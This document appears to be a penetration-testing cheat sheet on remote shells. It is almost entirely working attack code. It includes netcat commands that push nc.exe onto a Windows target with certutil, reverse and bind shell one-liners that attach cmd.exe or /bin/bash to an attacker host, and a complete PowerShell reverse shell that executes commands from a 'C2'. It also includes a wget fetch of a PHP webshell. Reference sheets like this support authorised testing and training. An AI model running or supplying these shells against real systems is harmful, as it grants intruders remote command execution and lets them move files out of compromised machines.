# Shells

## NetCat

> Windows Binaries in Linux: _/usr/share/windows-binaries/_

#### trasfering nc.exe

```bash
# Transfer nc.exe binaries to windows target machine: 

# exec in Attack machine 
cp /usr/share/windows-binaries/nc.exe .
python -m SimpleHTTPServer 80

# exec in Windows target machine
certutil -urlcache -f http://ATTACK_IP/nc.exe

# Listener port on attack machine: 

# exec in Attack machine
nc -lnvp PORT

# Connect from Windows Target to Linux Attack machine

# exec in Windows target machine
nc.exe -nv ATTACK_IP ATTACK_OPEN_PORT
```

#### Send files via NC

```bash
# Recipient Machine: (Windows)
nc.exe -nvlp PORT > file.txt

# Sender Machine: (Linux)
nc -nv REC_IP REC_PORT < file.txt
```

***

## Reverse Shell

A reverse shell is a type of remote shell where the target connect directly to a listener on the attacker's system.

{% embed url="https://www.revshells.com/" %}



### PS1 rev shell

{% embed url="https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1" %}

<details>

<summary>payload</summary>

```powershell
do {
    # Delay before establishing network connection, and between retries
    Start-Sleep -Seconds 1

    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.2', 13337)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close
```

</details>

### PHP Shells

#### wwwolf-php-webshell

{% embed url="https://github.com/WhiteWinterWolf/wwwolf-php-webshell" %}

{% code title="Download the shell locally" overflow="wrap" %}
```bash
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/refs/heads/master/webshell.php 
```
{% endcode %}



### Windows Target

[#nc.exe-file-transfer](./#nc.exe-file-transfer "mention")

```bash
#Attacker Machine (Linux)
nc -lvnp PORT

# transfer the nc.exe file into the target machine

#Target Machine (Windows)
nc.exe -nv ATTACK_IP ATTACK_PORT -e cmd.exe

# Powershell
powershell -e "<PAYLOAD>"
```

### Linux Target

```bash
#Attacker Machine (Linux)
nc -lnvp PORT

#Target Machine (Linux)
nc -nv ATTACKER_IP ATTACKER_PORT -e /bin/bash
```

***

## Bind Shell

A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system.

### Windows Target

```bash
#Target Machine (Windows)
nc.exe -nvlp PORT -e cmd.exe

#Attack machine (Linux)
nc -nv TARGET_IP TARGET_PORT
```

### Linux Target

```bash
#Target Machine (Linux)
nc -nvlp PORT -c /bin/bash

#Attack Machine (Windows)
nc.exe -nv TARGET_IP TARGET_PORT
# Attack Machine (Linux)
mc -nv TARGET_IP TARGET_PORT
```



##





